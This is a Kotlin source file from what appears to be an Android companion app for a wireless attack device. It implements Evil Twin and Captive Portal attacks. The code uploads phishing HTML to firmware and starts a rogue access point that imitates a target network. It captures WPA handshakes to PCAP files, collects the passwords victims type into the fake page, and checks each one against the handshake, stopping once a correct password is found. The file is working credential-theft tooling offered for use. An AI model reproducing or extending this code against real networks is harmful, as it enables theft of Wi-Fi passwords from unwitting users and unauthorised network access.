package com.swp81x.nrsuite

import android.net.Uri
import com.swp81x.nrsuite.core.credentials.CapturedCredential
import com.swp81x.nrsuite.core.credentials.CredentialSession
import com.swp81x.nrsuite.core.credentials.CredentialSource
import com.swp81x.nrsuite.core.credentials.CredentialStatus
import com.swp81x.nrsuite.core.eapol.EapolHandshake
import com.swp81x.nrsuite.core.eapol.EapolParser
import com.swp81x.nrsuite.core.history.HistoryLevel
import com.swp81x.nrsuite.core.wifi.bandForWifiChannel
import com.swp81x.nrsuite.core.wifi.normalizeWifiChannel
import com.swp81x.nrsuite.core.log.LogLevel
import com.swp81x.nrsuite.core.pcap.PcapWriter
import com.swp81x.nrsuite.core.portal.HtmlTemplateStore
import com.swp81x.nrsuite.core.portal.PortalHtmlRenderer
import com.swp81x.nrsuite.core.portal.PortalSessionMetrics
import com.swp81x.nrsuite.core.session.ConnectionState
import com.swp81x.nrsuite.core.session.NrSession
import com.swp81x.nrsuite.core.wpa.EvilTwinResult
import com.swp81x.nrsuite.core.wpa.WpaHandshake
import com.swp81x.nrsuite.core.wpa.WpaHandshakeParser
import com.swp81x.nrsuite.core.wpa.WpaHandshakeVerifier
import java.io.File
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject

private const val HTML_RAW_CHUNK_SIZE = 512
private const val HTML_TAIL_ALLOWANCE = 64

// Captive Portal and Evil Twin lifecycle, HTML upload, capture, and event logs.

internal fun MainViewModel.setEvilTwinHtmlFileImpl(uri: Uri, name: String?) {
    val displayName = name?.let { safeSafBasename(it, "evil_twin.html") }
        ?: resolveSafDisplayName(uri, "evil_twin.html")
    val size = querySafSize(uri)
    if (size != null && size > HtmlTemplateStore.MAX_TEMPLATE_BYTES) {
        _evilTwinHtmlUri.value = null
        _evilTwinHtmlName.value = null
        _evilTwinHtmlSelectedSize.value = null
        val message = "HTML file is ${size} bytes; firmware limit is " +
            "${HtmlTemplateStore.MAX_TEMPLATE_BYTES} bytes."
        appendLog("Evil Twin HTML rejected: $message", level = LogLevel.ERROR)
        _toastMessage.value = message
        return
    }
    _evilTwinHtmlUri.value = uri
    _evilTwinHtmlName.value = displayName
    _evilTwinHtmlSelectedSize.value = size
    _evilTwinHtmlUploading.value = false
    _evilTwinHtmlUploadProgress.value = 0
    _evilTwinHtmlComplete.value = false
    appendLog("Evil Twin HTML selected: $displayName${size?.let { " ($it bytes)" } ?: ""}.")
}

internal fun MainViewModel.clearEvilTwinHtmlFileImpl() {
    _evilTwinHtmlUri.value = null
    _evilTwinHtmlName.value = null
    _evilTwinHtmlSelectedSize.value = null
    _evilTwinHtmlUploading.value = false
    _evilTwinHtmlUploadProgress.value = 0
    _evilTwinHtmlComplete.value = false
    appendLog("Evil Twin HTML cleared.")
}

internal fun MainViewModel.setPortalHtmlFileImpl(uri: Uri, name: String?) {
    val displayName = name?.let { safeSafBasename(it, "portal.html") }
        ?: resolveSafDisplayName(uri, "portal.html")
    val size = querySafSize(uri)
    if (size != null && size > HtmlTemplateStore.MAX_TEMPLATE_BYTES) {
        _portalHtmlUri.value = null
        _portalHtmlName.value = null
        _portalHtmlSelectedSize.value = null
        val message = "HTML file is ${size} bytes; firmware limit is " +
            "${HtmlTemplateStore.MAX_TEMPLATE_BYTES} bytes."
        appendLog("Portal HTML rejected: $message", level = LogLevel.ERROR)
        _toastMessage.value = message
        return
    }
    _portalHtmlUri.value = uri
    _portalHtmlName.value = displayName
    _portalHtmlSelectedSize.value = size
    _portalHtmlUploading.value = false
    _portalHtmlUploadProgress.value = 0
    _portalHtmlComplete.value = false
    appendLog("Portal HTML selected: $displayName${size?.let { " ($it bytes)" } ?: ""}.")
}

internal fun MainViewModel.clearPortalHtmlFileImpl() {
    _portalHtmlUri.value = null
    _portalHtmlName.value = null
    _portalHtmlSelectedSize.value = null
    _portalHtmlUploading.value = false
    _portalHtmlUploadProgress.value = 0
    _portalHtmlComplete.value = false
    appendLog("Portal HTML cleared.")
}

internal fun MainViewModel.startPortalImpl(ssid: String, channel: Int, targetBssid: String) {
    if (_portalHtmlUri.value == null) {
        appendLog("Select an HTML template or file before starting Captive Portal.", level = LogLevel.ERROR)
        _toastMessage.value = "HTML template or file is required."
        return
    }
    startPortalInternalImpl(ssid, channel, targetBssid, _portalHtmlUri.value, "portal")
}

internal fun MainViewModel.startEvilTwinImpl(ssid: String, channel: Int, targetBssid: String) {
    if (_evilTwinHtmlUri.value == null) {
        appendLog("Select an HTML template or file before starting Evil Twin.", level = LogLevel.ERROR)
        _toastMessage.value = "HTML template or file is required."
        return
    }
    startPortalInternalImpl(ssid, channel, targetBssid, _evilTwinHtmlUri.value, "evil_twin")
}

internal fun MainViewModel.startPortalInternalImpl(ssid: String, channel: Int, targetBssid: String, htmlUri: Uri?, mode: String) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("Connect to a device before starting the portal.")
        return
    }
    if (_portalRunning.value || _portalStarting.value) return
    _portalStarting.value = true
    if (!ensureRadioIdle(if (mode == "evil_twin") "Evil Twin" else "Captive Portal")) {
        _portalStarting.value = false
        return
    }
    _portalMode.value = mode

    val cleanSsid = ssid.trim().ifBlank { "Free WiFi" }
    val cleanBssid = targetBssid.trim().uppercase()
    if (cleanBssid.isNotBlank() && !MainViewModel.MAC_PATTERN.matches(cleanBssid)) {
        appendLog("Invalid target BSSID: $cleanBssid")
        _portalStarting.value = false
        return
    }

    // Firmware radioIdle() stops other radio tasks when the portal starts.
    beaconStatusJob?.cancel()
    beaconStatusJob = null
    _beaconRunning.value = false
    if (_sniffing.value) {
        _sniffing.value = false
        pcapJob?.cancel()
        pcapJob = null
        scope.launch(Dispatchers.IO) {
            runCatching { pcapWriter?.close() }
            pcapWriter = null
        }
    }

    val safeChannel = normalizeWifiChannel(channel)
    if (!ensureWifiChannelAllowed(safeChannel, if (mode == "evil_twin") "Evil Twin" else "Captive Portal")) {
        _portalStarting.value = false
        return
    }
    _portalSsid.value = cleanSsid
    _portalChannel.value = safeChannel
    if (mode == "evil_twin") {
        _evilTwinMetrics.value = PortalSessionMetrics(ssid = cleanSsid, channel = safeChannel)
        _evilTwinVisitors.value = emptyList()
    } else {
        _portalMetrics.value = PortalSessionMetrics(ssid = cleanSsid, channel = safeChannel)
        _portalVisitors.value = emptyList()
        _portalCredentials.value = emptyList()
    }

    val startJob = scope.launch {
        val renderedHtmlFile = withContext(Dispatchers.IO) {
            htmlUri?.let { uri ->
                runCatching {
                    val directory = File(app.cacheDir, "portal").apply { mkdirs() }
                    val file = File(directory, "portal_${System.currentTimeMillis()}.html")
                    val input = app.contentResolver.openInputStream(uri)
                        ?: error("Could not open the selected HTML file")
                    input.use { source ->
                        file.outputStream().use { output ->
                            PortalHtmlRenderer.render(source, output, cleanSsid)
                        }
                    }
                    check(file.length() > 0L) { "Selected HTML file is empty" }
                    file
                }.onFailure { error ->
                    appendLog(
                        "Portal HTML render failed: ${error.message ?: error.javaClass.simpleName}",
                        level = LogLevel.ERROR,
                    )
                }.getOrNull()
            }
        }
        if (renderedHtmlFile == null) {
            val message = "Could not read/render the selected HTML file; portal was not started."
            appendLog(message, level = LogLevel.ERROR)
            _toastMessage.value = message
            _portalMode.value = null
            return@launch
        }
        val htmlSize = renderedHtmlFile.length()
        if (htmlSize > HtmlTemplateStore.MAX_TEMPLATE_BYTES) {
            renderedHtmlFile.delete()
            val message = "HTML is $htmlSize bytes; firmware limit is " +
                "${HtmlTemplateStore.MAX_TEMPLATE_BYTES} bytes."
            appendLog("Portal HTML rejected: $message", level = LogLevel.ERROR)
            _toastMessage.value = message
            _portalMode.value = null
            return@launch
        }
        if (htmlSize > HtmlTemplateStore.WARN_TEMPLATE_BYTES) {
            appendLog(
                "HTML warning: $htmlSize bytes is above " +
                    "${HtmlTemplateStore.WARN_TEMPLATE_BYTES / 1024} KB."
            )
        }
        appendLog(
            "Rendered portal HTML to a temporary file ($htmlSize bytes); " +
                "upload will stream from storage."
        )

        val args = JSONObject().apply {
            put("ssid", cleanSsid)
            put("band", bandForWifiChannel(safeChannel).wireName)
            put("channel", safeChannel)
            put("bssid", cleanBssid.ifBlank { "" })
            put("show_notice", _portalFirmwareNoticeEnabled.value)
        }
        appendLog("Starting captive portal '$cleanSsid' on channel $safeChannel...")
        val response = activeSession.sendCommand("START_PORTAL", args, timeoutMs = 15_000)
        if (response?.optBoolean("ok") != true) {
            val errorCode = response?.optString("error").orEmpty()
            val errorMessage = when (errorCode) {
                "regulatory_channel_blocked" ->
                    "Channel $safeChannel is not allowed in the current country. " +
                        "Change the Wi-Fi regulatory country in Settings."
                "softap_start_failed" ->
                    "The access point failed to start on channel $safeChannel. " +
                        "Try another allowed channel."
                else -> response?.optString("msg")?.takeIf { it.isNotBlank() } ?: "timeout"
            }
            renderedHtmlFile.delete()
            appendLog("Failed to start portal: $errorMessage")
            portalLogImpl("Portal start failed: $errorMessage")
            _toastMessage.value = errorMessage
            _portalMode.value = null
            return@launch
        }

        _portalRunning.value = true
        updateForegroundService()
        _portalHtmlSize.value = 0
        if (mode == "evil_twin") {
            _evilTwinHtmlUploading.value = false
            _evilTwinHtmlUploadProgress.value = 0
        } else {
            _portalHtmlUploading.value = false
            _portalHtmlUploadProgress.value = 0
        }
        _portalHandshake.value = EapolHandshake()
        _portalWpaHandshake.value = WpaHandshake()

        activePortalTargetBssid = cleanBssid
        if (mode == "evil_twin") {
            _evilTwinPasswords.value = emptyList()
            _evilTwinResults.value = emptyList()
            _evilTwinEventLog.value = emptyList()
        }
        synchronized(credentialLock) {
            activeCredentialSession = CredentialSession(
                id = System.currentTimeMillis().toString(),
                source = if (mode == "evil_twin") {
                    CredentialSource.EVIL_TWIN
                } else {
                    CredentialSource.PORTAL
                },
                ssid = cleanSsid,
                bssid = cleanBssid,
                channel = channel.coerceIn(1, 13),
                startedAt = timestampNow(),
                endedAt = null,
                pcapPath = null,
                credentials = emptyList(),
            )
            evilTwinAutoStopIssued = false
        }

        if (cleanBssid.isNotBlank()) {
            portalPcapJob?.cancel()
            runCatching { portalPcapWriter?.close() }
            portalPcapWriter = null
            portalPcapFile = null
            _evilTwinCapturePath.value = null

            val captureDir = File(app.filesDir, "EvilTwin")
            if (captureDir.exists() || captureDir.mkdirs()) {
                val macName = cleanBssid.replace(":", "").uppercase()
                val captureFile = File(captureDir, "${macName}_eviltwin_${System.currentTimeMillis()}.pcap")
                portalPcapWriter = runCatching { PcapWriter(captureFile) }.getOrNull()
                portalPcapFile = captureFile
                _evilTwinCapturePath.value = captureFile.absolutePath
                synchronized(credentialLock) {
                    activeCredentialSession = activeCredentialSession?.copy(
                        pcapPath = captureFile.absolutePath,
                    )
                }
                if (portalPcapWriter != null) {
                    appendLog("Evil Twin capture: ${captureFile.absolutePath}")
                } else {
                    appendLog("Could not create Evil Twin PCAP capture file.")
                }
            }

            val captureHandshake = EapolHandshake()
            val wpaHandshake = WpaHandshake()
            var handshakeWasComplete = false
            portalPcapJob = scope.launch(Dispatchers.IO) {
                try {
                    activeSession.pcap.collect { frame ->
                        runCatching {
                            portalPcapWriter?.writePacket(frame)
                            EapolParser.parse(frame, captureHandshake)
                            _portalHandshake.value = captureHandshake.copy()
                            WpaHandshakeParser.parse(frame, wpaHandshake)
                            _portalWpaHandshake.value = wpaHandshake.copyHandshake()

                            val completeNow = wpaHandshake.isComplete
                            if (completeNow != handshakeWasComplete) {
                                handshakeWasComplete = completeNow
                                verifyEvilTwinPasswordsImpl()
                            }
                        }.onFailure { error ->
                            appendLog("Evil Twin capture parse/write error: ${error.message}")
                        }
                    }
                } catch (_: Throwable) {
                    // USB unplug can end the flow abruptly; cleanup handles state.
                }
            }
        }
        htmlCompleteFlowImpl().value = false

        val uploadOk = uploadPortalHtmlImpl(activeSession, renderedHtmlFile)
        renderedHtmlFile.delete()
        if (!uploadOk) {
            val message = "Firmware rejected the HTML upload; portal was stopped."
            appendLog(message, level = LogLevel.ERROR)
            _toastMessage.value = message
            stopPortalImpl()
            return@launch
        }

        startPortalStatusPollingImpl(activeSession)
        appendLog("Portal is running.")
        addHistory("portal", "Portal started: $cleanSsid", HistoryLevel.SUCCESS)
    }
    startJob.invokeOnCompletion {
        _portalStarting.value = false
    }
}

internal fun MainViewModel.htmlUploadingFlowImpl(): MutableStateFlow<Boolean> {
    return if (_portalMode.value == "evil_twin") _evilTwinHtmlUploading else _portalHtmlUploading
}

internal fun MainViewModel.htmlUploadProgressFlowImpl(): MutableStateFlow<Int> {
    return if (_portalMode.value == "evil_twin") _evilTwinHtmlUploadProgress else _portalHtmlUploadProgress
}

internal fun MainViewModel.htmlCompleteFlowImpl(): MutableStateFlow<Boolean> {
    return if (_portalMode.value == "evil_twin") _evilTwinHtmlComplete else _portalHtmlComplete
}

internal suspend fun MainViewModel.uploadPortalHtmlImpl(session: NrSession, file: File): Boolean {
    val complete = htmlCompleteFlowImpl()
    complete.value = false
    val uploading = htmlUploadingFlowImpl()
    val progress = htmlUploadProgressFlowImpl()
    uploading.value = true
    progress.value = 0
    return try {
        uploadPortalHtmlInternalImpl(session, file)
    } finally {
        uploading.value = false
        if (complete.value) {
            progress.value = 100
        }
    }
}

internal suspend fun MainViewModel.uploadPortalHtmlInternalImpl(session: NrSession, file: File): Boolean {
    val totalBytes = file.length()
    if (totalBytes <= 0L || totalBytes > HtmlTemplateStore.MAX_TEMPLATE_BYTES) {
        appendLog(
            "HTML upload rejected: ${file.length()} bytes is outside the firmware limit of " +
                "${HtmlTemplateStore.MAX_TEMPLATE_BYTES} bytes."
        )
        return false
    }
    val totalInt = totalBytes.toInt()

    val supportsOffset = (_connectionState.value as? ConnectionState.Connected)
        ?.features
        ?.contains("portal_html_offset") == true
    appendLog(
        "Uploading HTML: $totalBytes bytes in " +
            "${(totalBytes + HTML_RAW_CHUNK_SIZE - 1) / HTML_RAW_CHUNK_SIZE} chunk(s) " +
            "(mode=${if (supportsOffset) "offset" else "legacy-append"}, file-backed)."
    )

    val reset = session.sendCommand(
        "RESET_HTML",
        JSONObject().put("size", totalInt),
        timeoutMs = 10_000,
    )
    if (reset?.optBoolean("ok") != true) {
        val firmwareError = reset?.optString("msg")?.takeIf { it.isNotBlank() }
            ?: reset?.optString("error")?.takeIf { it.isNotBlank() }
        appendLog(
            "Device rejected RESET_HTML (size=$totalInt)" +
                (firmwareError?.let { ": $it" } ?: "; check portal filesystem/storage."),
            level = LogLevel.ERROR,
        )
        return false
    }

    delay(250)
    var offset = 0
    var chunkIndex = 0
    val buffer = ByteArray(HTML_RAW_CHUNK_SIZE)
    file.inputStream().buffered().use { input ->
        while (offset < totalInt) {
            val requested = minOf(buffer.size, totalInt - offset)
            val read = input.read(buffer, 0, requested)
            if (read <= 0) {
                appendLog("HTML upload aborted: temporary file ended at $offset/$totalInt bytes.")
                return false
            }
            val isLast = offset + read >= totalInt
            val encoded = android.util.Base64.encodeToString(buffer, 0, read, android.util.Base64.NO_WRAP)

            var success = false
            for (attempt in 1..3) {
                val args = JSONObject().apply {
                    put("data", encoded)
                    put("last", isLast)
                    if (supportsOffset) {
                        put("offset", offset)
                    }
                }
                val response = session.sendCommand("SET_HTML_CHUNK", args, timeoutMs = 5_000)
                if (response?.optBoolean("ok") == true) {
                    success = true
                    break
                }
                appendLog(
                    "HTML chunk $chunkIndex offset $offset attempt $attempt failed: " +
                        (response ?: "timeout")
                )
                delay(400)
            }
            if (!success) {
                appendLog("HTML upload aborted at chunk $chunkIndex (offset $offset).")
                return false
            }

            offset += read
            chunkIndex++
            _portalHtmlSize.value = offset
            htmlUploadProgressFlowImpl().value =
                ((offset.toLong() * 100L) / totalBytes).toInt().coerceIn(0, 100)
            if (isLast) appendLog("HTML final chunk sent ($totalInt bytes at offset $offset).")
            delay(80)
        }
    }

    delay(350)
    var status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000)
    var complete = status?.optBoolean("html_complete") == true
    if (!complete) {
        delay(500)
        status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000) ?: status
        complete = status?.optBoolean("html_complete") == true
    }

    val deviceSize = status?.optInt("html_size", 0) ?: 0
    val deviceExpected = status?.optInt("html_expected", totalInt) ?: totalInt
    if (!complete) {
        appendLog(
            "HTML upload did not complete on device " +
                "(device reports size=$deviceSize, expected=$deviceExpected)."
        )
        return false
    }
    if (deviceSize < totalInt) {
        appendLog("HTML size mismatch: sent $totalInt bytes, device reports $deviceSize.")
        return false
    }
    if (deviceSize > totalInt + HTML_TAIL_ALLOWANCE) {
        appendLog("Portal HTML file looks corrupted: sent $totalInt bytes, device reports $deviceSize.")
        return false
    }

    appendLog("HTML upload complete; device reports $deviceSize bytes (expected $deviceExpected).")
    htmlCompleteFlowImpl().value = true
    return true
}

internal fun MainViewModel.clearEvilTwinPasswordsImpl() {
    _evilTwinPasswords.value = emptyList()
    _evilTwinResults.value = emptyList()
}

internal fun MainViewModel.verifyEvilTwinPasswordsImpl() {
    val handshake = _portalWpaHandshake.value
    val ssid = _evilTwinMetrics.value.ssid.ifBlank { _portalSsid.value }
    val finalStatuses = setOf(
        EvilTwinResult.Status.CORRECT,
        EvilTwinResult.Status.INCORRECT,
        EvilTwinResult.Status.INVALID_LENGTH,
    )
    val previousByPassword = _evilTwinResults.value.associateBy { it.password }

    val mapped = _evilTwinPasswords.value.map { captured ->
        val password = captured.value
        val existing = previousByPassword[password]?.status
        val status = when {
            existing in finalStatuses -> existing!!
            !handshake.isComplete -> EvilTwinResult.Status.PENDING
            password.length !in 8..63 -> EvilTwinResult.Status.INVALID_LENGTH
            WpaHandshakeVerifier.verify(handshake, ssid, password) -> EvilTwinResult.Status.CORRECT
            else -> EvilTwinResult.Status.INCORRECT
        }
        EvilTwinResult(
            password = password,
            status = status,
            timestamp = captured.capturedAt,
        )
    }

    val correctResults = mapped.filter { it.status == EvilTwinResult.Status.CORRECT }
    _evilTwinResults.value = if (correctResults.isNotEmpty()) correctResults else mapped

    val correct = correctResults.firstOrNull() ?: return
    val shouldStop = synchronized(credentialLock) {
        if (evilTwinAutoStopIssued) {
            false
        } else {
            evilTwinAutoStopIssued = true
            val credential = CapturedCredential(
                value = correct.password,
                capturedAt = correct.timestamp,
                status = CredentialStatus.CORRECT,
                source = CredentialSource.EVIL_TWIN,
            )
            val current = activeCredentialSession
            val finished = (current ?: CredentialSession(
                id = System.currentTimeMillis().toString(),
                source = CredentialSource.EVIL_TWIN,
                ssid = ssid.ifBlank { "(hidden)" },
                bssid = activePortalTargetBssid,
                channel = _evilTwinMetrics.value.channel.takeIf { it > 0 },
                startedAt = timestampNow(),
                endedAt = null,
                pcapPath = portalPcapFile?.absolutePath,
                credentials = emptyList(),
            )).copy(
                endedAt = timestampNow(),
                pcapPath = current?.pcapPath ?: portalPcapFile?.absolutePath,
                credentials = listOf(credential),
            )
            activeCredentialSession = null
            upsertCredentialSessionLocked(finished)
            appendLog("Correct password captured; stopping Evil Twin...")
            addHistory(
                "evil_twin",
                "Correct password captured for ${ssid.ifBlank { "target" }}",
                HistoryLevel.SUCCESS,
            )
            true
        }
    }
    if (shouldStop) {
        stopPortalImpl()
    }
}

internal fun MainViewModel.clearEvilTwinEventLogImpl() {
    _evilTwinEventLog.value = emptyList()
}

internal fun MainViewModel.clearPortalEventLogImpl() {
    _portalEventLog.value = emptyList()
}

internal fun MainViewModel.clearPortalVisitorsImpl() {
    _portalVisitors.value = emptyList()
}

internal fun MainViewModel.clearEvilTwinVisitorsImpl() {
    _evilTwinVisitors.value = emptyList()
}

internal fun MainViewModel.portalLogImpl(message: String) {
    val timestamp = java.time.LocalTime.now()
        .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
    val line = "[$timestamp] $message"
    if (_portalMode.value == "evil_twin") {
        _evilTwinEventLog.update { (it + line).takeLast(300) }
    } else {
        _portalEventLog.update { (it + line).takeLast(300) }
    }
}

internal fun MainViewModel.stopPortalImpl() {
    if (_portalStopping.value) return
    finishActiveCredentialSession()
    if (!_portalRunning.value) {
        _portalStarting.value = false
        _portalStopping.value = false
        return
    }
    _portalStopping.value = true
    portalStatusJob?.cancel()
    portalStatusJob = null
    portalPcapJob?.cancel()
    portalPcapJob = null
    val savedCapture = portalPcapFile
    runCatching { portalPcapWriter?.close() }
    portalPcapWriter = null
    portalPcapFile = null
    exportPcapToRootIfConfigured(savedCapture)

    val activeSession = session
    scope.launch {
        try {
            val response = runCatching {
                activeSession?.sendCommand("STOP_PORTAL", timeoutMs = 8_000)
            }.getOrNull()
            if (response?.optBoolean("ok") == true) {
                appendLog("Portal stopped.")
                savedCapture?.let { appendLog("Evil Twin capture saved: ${it.absolutePath}") }
                addHistory("portal", "Portal stopped", HistoryLevel.SUCCESS)
            } else {
                appendLog("Portal stop request sent, but the device did not confirm.")
            }
        } finally {
            // This also runs if USB is unplugged or the stop command throws.
            _portalRunning.value = false
            _portalStopping.value = false
            _portalStarting.value = false
            _portalMode.value = null
            updateForegroundService()
        }
    }
}

internal fun MainViewModel.startPortalStatusPollingImpl(activeSession: NrSession) {
    portalStatusJob?.cancel()
    portalStatusJob = scope.launch {
        while (isActive && _portalRunning.value) {
            delay(3_000)
            if (_connectionState.value !is ConnectionState.Connected) break
            val response = runCatching {
                activeSession.sendCommand("PORTAL_STATUS", timeoutMs = 4_000)
            }.getOrNull() ?: continue
            if (response.optBoolean("ok")) {
                _portalRunning.value = response.optBoolean("running", _portalRunning.value)
                _portalHtmlSize.value = response.optInt("html_size", _portalHtmlSize.value)
                htmlCompleteFlowImpl().value = response.optBoolean("html_complete", htmlCompleteFlowImpl().value)
            }
        }
    }
}

internal fun MainViewModel.stopLocalPortalImpl(sendStop: Boolean = true) {
    portalStatusJob?.cancel()
    portalStatusJob = null
    if (!_portalRunning.value) {
        _portalStarting.value = false
        _portalStopping.value = false
        return
    }
    _portalRunning.value = false
    _portalStopping.value = false
    _portalStarting.value = false
    if (sendStop) {
        val current = session
        if (current != null) {
            scope.launch {
                runCatching { current.sendCommand("STOP_PORTAL", timeoutMs = 4_000) }
            }
        }
    }
}
